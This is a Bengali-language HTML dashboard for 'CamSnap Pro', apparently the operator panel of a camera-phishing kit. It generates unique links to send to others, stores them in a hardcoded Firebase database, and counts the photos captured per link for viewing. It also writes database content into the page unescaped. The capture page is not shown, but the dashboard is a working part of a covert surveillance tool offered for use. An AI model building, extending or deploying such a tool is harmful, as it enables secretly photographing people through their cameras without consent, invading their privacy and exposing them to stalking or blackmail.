<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CamSnap Pro • Dashboard</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
    body{background:#f5f7fa;color:#222;min-height:100vh;}
    header{background:#fff;padding:18px;text-align:center;box-shadow:0 4px 15px rgba(0,0,0,0.08);}
    header img{height:70px;border-radius:14px;}
    main{max-width:560px;margin:20px auto;padding:0 16px;}
    .card{background:#fff;border-radius:26px;padding:35px;box-shadow:0 15px 45px rgba(0,0,0,0.12);text-align:center;}
    h1{font-size:2.3em;margin-bottom:12px;}
    p{font-size:1.12em;color:#444;line-height:1.7;margin-bottom:32px;}
    button{background:#0066ff;color:#fff;border:none;padding:20px;font-size:1.5em;border-radius:20px;width:100%;cursor:pointer;font-weight:600;box-shadow:0 10px 30px rgba(0,102,255,0.4);}
    button:hover{background:#0052cc;}

    /* ছোট + সুন্দর লিংক কার্ড */
    #linksList{margin-top:35px;}
    .link-card{
      background:#fff;border:2px solid #0066ff;border-radius:18px;padding:18px;margin:16px 0;
      box-shadow:0 8px 25px rgba(0,102,255,0.15);transition:0.3s;
    }
    .link-card:hover{transform:translateY(-5px);box-shadow:0 15px 35px rgba(0,102,255,0.25);}
    .link-id{font-size:1.3em;font-weight:700;color:#0066ff;margin-bottom:6px;}
    .link-url{font-size:1em;color:#333;word-break:break-all;margin:8px 0;line-height:1.4;}
    .actions button{padding:9px 18px;margin:4px;font-size:0.95em;border-radius:10px;}
    .copyBtn{background:#28a745;color:#fff;}
    .viewBtn{background:#ff4444;color:#fff;font-weight:600;}
    .created{color:#777;font-size:0.9em;margin-top:8px;}

    .no-links{color:#0066ff;text-align:center;padding:60px 0;font-size:1.3em;}
  </style>
</head>
<body>

<header>
  <img src="https://raw.githubusercontent.com/shakib0122222/camnei/8ad3b81b56f353f490397fc5a03c41daea82cd7f/20251130_085522.png" alt="CamSnap">
</header>

<main>
  <div class="card">
    <h1>CamSnap Pro</h1>
    <p>নতুন লিংক বানাও → পাঠাও → ভিউ করে ছবি দেখো!</p>
    <button onclick="createLink()">নতুন লিংক তৈরি করুন</button>

    <div id="linksList" class="no-links">কোনো লিংক তৈরি করা হয়নি</div>
  </div>
</main>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const linksRef = db.ref('links');

function createLink() {
  const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
  const url = location.origin + location.pathname + id;

  linksRef.child(id).set({
    url: url,
    created: new Date().toLocaleString('bn-BD'),
    sessions: {}
  }).then(() => alert("লিংক তৈরি হয়েছে!"));
}

function copyLink(url) {
  navigator.clipboard.writeText(url);
  alert("কপি হয়ে গেছে!");
}

linksRef.on('value', (snap) => {
  const data = snap.val();
  const container = document.getElementById("linksList");

  if (!data || Object.keys(data).length === 0) {
    container.innerHTML = '<div class="no-links">কোনো লিংক তৈরি করা হয়নি</div>';
    return;
  }

  let html = '';
  Object.keys(data).sort((a,b) => b.localeCompare(a)).forEach(id => {
    const item = data[id];
    const totalPhotos = Object.values(item.sessions || {}).reduce((a, s) => a + (s.photos?.length || 0), 0);

    html += `
      <div class="link-card">
        <div class="link-id">ID: ${id}</div>
        <div class="link-url">${item.url}</div>
        <div class="actions">
          <button class="copyBtn" onclick="copyLink('${item.url}')">কপি</button>
          <a href="viewer.html?id=${id}" target="_blank">
            <button class="viewBtn">ভিউ করুন (${totalPhotos} ছবি)</button>
          </a>
        </div>
        <small class="created">তৈরি: ${item.created}</small>
      </div>
    `;
  });
  container.innerHTML = html;
});
</script>
</body>
</html>
